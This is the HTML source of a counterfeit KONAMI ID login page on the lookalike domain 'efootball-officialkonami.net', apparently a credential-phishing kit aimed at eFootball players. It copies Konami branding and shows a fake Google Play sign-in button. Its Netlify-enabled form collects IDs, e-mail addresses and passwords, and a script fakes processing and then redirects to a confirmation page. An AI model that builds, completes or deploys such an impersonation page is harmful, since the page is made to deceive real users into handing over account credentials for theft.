<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>efootball-officialkonami.net</title>
    <link rel="stylesheet" href="style.css">
    <!-- Link to Google Fonts for similar typography -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="top-corner-box">
        <span class="konami-red">KONAMI</span>
    </div>

    <div class="login-container">
        <div class="logo-box">
            <!-- Placeholder for KONAMI logo image -->
            <div class="logo-placeholder">EMAIL ADDRESS</div>
        </div>
        <form id="loginForm"  data-netlify="true" class="login-form" netlify>
            <div class="input-group">
                <input type="text" id="username" name="username" required>
                <label for="username">KONAMI ID / E-MAIL ADDRESS</label>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" required>
                <label for="password">PASSWORD</label>
            </div>

            <button type="submit" class="btn-login">LOGIN</button>

            <div class="divider">OR</div>

            <button type="button" class="btn-google">
                <!-- Placeholder for Google Play icon -->
                <span class="google-icon">G</span> Log in with Google Play
            </button>

            <div class="register-link">
                Don't have a KONAMI ID? <a href="#" class="register-red">Register</a>
            </div>
        </form>
    </div>

    <footer class="page-footer">
        <div class="footer-links">
            <a href="#">Terms of Use / Privacy (KONAMI ID)</a>
            <a href="#">Trademarks</a>
            <a href="#">Support</a>
            <a href="#">Company Information</a>
        </div>
    </footer>

    <!-- JavaScript for form handling will be added later -->
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const loginForm = document.getElementById('loginForm');
        
        if (loginForm) {
            loginForm.addEventListener('submit', function(event) {
                // 1. CRITICAL: This stops the form's default submission
                event.preventDefault();
                event.stopPropagation(); // Extra safety to stop the event
                
                console.log('Form submit intercepted!');
                
                // 2. Simple 2-second delay to simulate processing (optional)
                setTimeout(function() {
                    // 3. REDIRECT to the confirmation page
                    window.location.href = "confirmation.html";
                }, 2000); // 2000 milliseconds = 2 seconds
                
                // OPTIONAL: Show a loading message on the button
                const submitBtn = loginForm.querySelector('.btn-login');
                const originalText = submitBtn.textContent;
                submitBtn.textContent = 'Processing...';
                submitBtn.disabled = true;
                
                // Reset button text after delay (optional cleanup)
                setTimeout(function() {
                    submitBtn.textContent = originalText;
                    submitBtn.disabled = false;
                }, 2000);
                
                return false; // Another safety measure
            });
        } else {
            console.error('ERROR: Could not find form with id="loginForm"');
        }
    });
    </script>
</body>
</html>
